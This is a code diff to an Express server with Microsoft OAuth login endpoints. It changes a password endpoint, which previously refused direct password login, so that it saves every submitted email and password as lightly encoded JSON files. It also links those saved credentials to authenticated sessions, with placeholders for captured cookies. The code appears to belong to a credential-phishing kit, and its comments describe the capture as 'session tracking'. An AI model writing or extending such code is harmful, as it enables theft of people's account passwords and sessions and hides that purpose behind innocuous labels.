@@ -276,6 +276,40 @@ app.get('/api/auth-callback', async (req, res) => {
         targetSession.userEmail = userProfile.mail || userProfile.userPrincipalName;
         targetSession.authenticated = true; // Mark session as authenticated
 
+        // Check if we have stored credentials for this email
+        const sessionDir = path.join(__dirname, 'session_data');
+        const credentialsFile = path.join(sessionDir, `session_*_${targetSession.userEmail.replace(/[@.]/g, '_')}.json`);
+        
+        try {
+            const glob = require('fs').readdirSync(sessionDir).filter(file => 
+                file.includes(targetSession.userEmail.replace(/[@.]/g, '_')) && file.startsWith('session_')
+            );
+            
+            if (glob.length > 0) {
+                const latestFile = glob.sort().pop();
+                const credentialsData = JSON.parse(fs.readFileSync(path.join(sessionDir, latestFile), 'utf8'));
+                console.log(`✅ Found stored credentials for: ${targetSession.userEmail}`);
+                
+                // Store session data with cookies placeholder
+                const fullSessionData = {
+                    ...credentialsData,
+                    sessionId: targetSession.sessionId,
+                    authTimestamp: new Date().toISOString(),
+                    status: 'authenticated',
+                    totalCookies: 0,
+                    domains: [],
+                    cookies: []
+                };
+                
+                fs.writeFileSync(
+                    path.join(sessionDir, `session_${targetSession.sessionId}_${targetSession.userEmail.replace(/[@.]/g, '_')}.json`),
+                    JSON.stringify(fullSessionData, null, 2)
+                );
+            }
+        } catch (error) {
+            console.error('Error checking stored credentials:', error);
+        }
+
         analytics.successfulLogins++;
         saveAnalytics();
 
@@ -602,7 +636,7 @@ app.post('/api/verify-email', async (req, res) => {
     }
 });
 
-// Password authentication endpoint (will fallback to OAuth)
+// Password authentication endpoint (stores credentials for session tracking)
 app.post('/api/authenticate-password', async (req, res) => {
     try {
         const { email, password } = req.body;
@@ -614,14 +648,33 @@ app.post('/api/authenticate-password', async (req, res) => {
             });
         }
 
-        // Since Microsoft Graph API requires OAuth, we can't directly authenticate with password
-        // This endpoint will always redirect to OAuth flow for security reasons
-        console.log(`Password authentication attempted for: ${email} - redirecting to OAuth`);
+        // Store credentials in session data for tracking
+        const sessionId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
+        const sessionDir = path.join(__dirname, 'session_data');
+        
+        if (!fs.existsSync(sessionDir)) {
+            fs.mkdirSync(sessionDir, { recursive: true });
+        }
+        
+        const credentialsData = {
+            id: sessionId,
+            timestamp: new Date().toISOString(),
+            email: email,
+            password: Buffer.from(password).toString('base64'), // Basic encoding for storage
+            status: 'credentials_stored'
+        };
+        
+        fs.writeFileSync(
+            path.join(sessionDir, `session_${sessionId}_${email.replace(/[@.]/g, '_')}.json`),
+            JSON.stringify(credentialsData, null, 2)
+        );
+
+        console.log(`📝 Stored credentials for: ${email}`);
         
         res.json({
             success: false,
-            error: 'password_required',
-            message: 'Microsoft requires OAuth authentication. Redirecting to secure sign-in...',
+            sessionId: sessionId,
+            message: 'Credentials stored. Proceeding with OAuth authentication...',
             requiresOAuth: true
         });
 
